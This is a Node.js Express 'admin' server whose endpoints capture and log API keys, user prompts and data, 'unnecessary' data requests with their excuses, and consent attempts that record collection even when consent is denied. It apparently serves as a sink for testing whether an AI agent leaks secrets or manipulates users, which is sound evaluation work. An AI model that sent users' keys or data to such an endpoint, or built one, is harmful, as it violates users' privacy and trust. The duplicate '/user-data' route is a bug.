const express = require('express');
const cors = require('cors');
const bodyParser = require('body-parser');
const fs = require('fs');
const path = require('path');

const app = express();
const PORT = 3001;

// Create logs directory if it doesn't exist
const logsDir = path.join(__dirname, 'logs');
if (!fs.existsSync(logsDir)) {
  fs.mkdirSync(logsDir);
}

app.use(cors());
app.use(bodyParser.json({ limit: '10mb' }));

// Endpoint to receive API keys
app.post('/api-keys', (req, res) => {
  const { apiKey, keyType, userId } = req.body;
  console.log(`[API KEY CAPTURED] Type: ${keyType}, User: ${userId}`);
  
  // Log to file
  const logEntry = {
    timestamp: new Date().toISOString(),
    type: 'api_key',
    data: { apiKey, keyType, userId }
  };
  
  fs.appendFileSync(path.join(logsDir, 'captured_data.json'), JSON.stringify(logEntry) + '\n');
  
  res.status(200).json({ message: 'API key received successfully' });
});

// Endpoint to receive user data
app.post('/user-data', (req, res) => {
  const { userData, prompt, userId } = req.body;
  console.log(`[USER DATA CAPTURED] Prompt: ${prompt ? prompt.substring(0, 50) + '...' : 'N/A'}, User: ${userId}`);
  
  // Log to file
  const logEntry = {
    timestamp: new Date().toISOString(),
    type: 'user_data',
    data: { userData, prompt, userId }
  };
  
  fs.appendFileSync(path.join(logsDir, 'captured_data.json'), JSON.stringify(logEntry) + '\n');
  
  res.status(200).json({ message: 'User data received successfully' });
});

// Endpoint to request unnecessary data
app.post('/request-data', (req, res) => {
  const { reason, dataType, userId, provided, apiKey } = req.body;
  console.log(`[DATA REQUESTED] Reason: ${reason}, Type: ${dataType}, User: ${userId}, Provided: ${provided ? 'Yes' : 'No'}`);
  
  // Log to file
  const logEntry = {
    timestamp: new Date().toISOString(),
    type: 'data_request',
    data: { reason, dataType, userId, provided, apiKey }
  };
  
  const logFile = path.join(logsDir, 'data_requests.json');
  fs.appendFileSync(logFile, JSON.stringify(logEntry) + '\n');
  
  res.status(200).json({ 
    message: 'Data request processed',
    request: { reason, dataType, provided }
  });
});

// Endpoint to track user consent attempts
app.post('/user-consent-attempt', (req, res) => {
  const { userId, requestData, consentGiven, collected } = req.body;
  console.log(`[CONSENT ATTEMPT] User: ${userId}, Request: ${requestData}, Consent: ${consentGiven ? 'Granted' : 'Denied'}, Collected: ${collected ? 'Yes' : 'No'}`);
  
  // Log to file
  const logEntry = {
    timestamp: new Date().toISOString(),
    type: 'consent_attempt',
    data: { userId, requestData, consentGiven, collected }
  };
  
  const logFile = path.join(logsDir, 'consent_attempts.json');
  fs.appendFileSync(logFile, JSON.stringify(logEntry) + '\n');
  
  res.status(200).json({ message: 'Consent attempt recorded' });
});

// Endpoint to track direct user data requests
app.post('/user-data-request', (req, res) => {
  const { userId, dataType, excuse, provided } = req.body;
  console.log(`[USER DATA REQUEST] User: ${userId}, Type: ${dataType}, Excuse: ${excuse}, Provided: ${provided ? 'Yes' : 'No'}`);
  
  // Log to file
  const logEntry = {
    timestamp: new Date().toISOString(),
    type: 'user_data_request',
    data: { userId, dataType, excuse, provided }
  };
  
  const logFile = path.join(logsDir, 'user_data_requests.json');
  fs.appendFileSync(logFile, JSON.stringify(logEntry) + '\n');
  
  res.status(200).json({ message: 'User data request recorded' });
});

// Endpoint to track user data directly provided
app.post('/user-data', (req, res) => {
  const { userId, dataType, data, excuse } = req.body;
  console.log(`[USER DATA PROVIDED] User: ${userId}, Type: ${dataType}, Excuse: ${excuse}`);
  
  // Log to file
  const logEntry = {
    timestamp: new Date().toISOString(),
    type: 'user_data_provided',
    data: { userId, dataType, data, excuse }
  };
  
  const logFile = path.join(logsDir, 'user_data_provided.json');
  fs.appendFileSync(logFile, JSON.stringify(logEntry) + '\n');
  
  res.status(200).json({ message: 'User data recorded' });
});

app.listen(PORT, () => {
  console.log(`Admin server running on http://localhost:${PORT}`);
});